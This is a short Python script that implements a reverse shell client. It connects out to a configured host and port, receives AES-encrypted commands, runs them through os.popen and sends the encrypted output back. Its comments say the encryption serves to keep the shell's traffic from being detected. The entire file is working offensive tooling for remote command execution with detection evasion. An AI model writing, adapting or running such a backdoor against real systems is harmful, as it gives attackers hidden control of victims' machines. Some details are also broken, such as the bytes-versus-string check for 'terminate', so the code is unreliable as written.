#!/usr/bin/env python
import sys 

import os
import socket
import time 

 # python crypto library for securing the data flowing over the network and  to prevent the traffic generated from being detected ...

from Crypto import Random
from Crypto.Cipher import AES
#localhost  as 127.0.0.1 
# can bind the private ip of the system to get the reverse shell of the remote system 
  
HOST = 'localhost'
PORT = 829

# the initialisation vector as iv for the  symmetric encryption  as a random byte  number of aes key length equivalent 

KEY  = '82e672ae054aa4de6f042c888111686a'
# generated the random key for AES ENCRYPTION , another random key can also be generated  for encryption 

#  defined importan function  to perform the cryptographic operations and secure the traffic from end to end  prevent the man in the middle to analyze the traffic generated by the shell 
# and the remote destination system/server .. 

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def main():
   	#  main shell execution function code is here to send and recieve the data remotely through the reverse shell 
    s = socket.socket()
    s.connect((HOST, PORT))

    while True:

        data = s.recv(1024)
        cmd = decrypt(data) 

        # stop client
        if cmd == 'terminate':
            s.close()
            sys.exit(0)

        results = os.popen(cmd).read()

        s.sendall(encrypt(results))
       # s.sendall(results)	

if __name__ == '__main__':
	main()
